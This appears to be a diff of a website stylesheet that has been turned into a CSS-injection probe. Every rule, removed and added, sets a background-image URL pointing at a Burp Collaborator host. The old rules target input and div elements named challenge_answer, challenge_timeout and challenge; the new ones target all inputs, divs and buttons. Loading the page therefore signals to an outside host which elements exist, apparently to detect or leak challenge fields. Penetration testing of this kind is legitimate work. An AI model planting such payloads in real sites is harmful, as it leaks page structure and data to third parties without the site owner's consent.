@@ -18,21 +18,12 @@ div.branding {
     background-size: cover;
 }
 
-input[name=challenge_answer]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/challenge_answer");
+input{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/input");
 }
-input[name=challenge_timeout]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/challenge_timeout");
+div{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/div");
 }
-input[name=challenge]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/challenge");
-}
-div[name=challenge_answer]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/challenge_answer2");
-}
-div[name=challenge_timeout]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/challenge_timeout2");
-}
-div[name=challenge]{
-    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/challenge2");
+button{
+    background-image: url("https://s3wim2k8iatrcox0fd75c3pjmas2gr.burpcollaborator.net/button");
 }
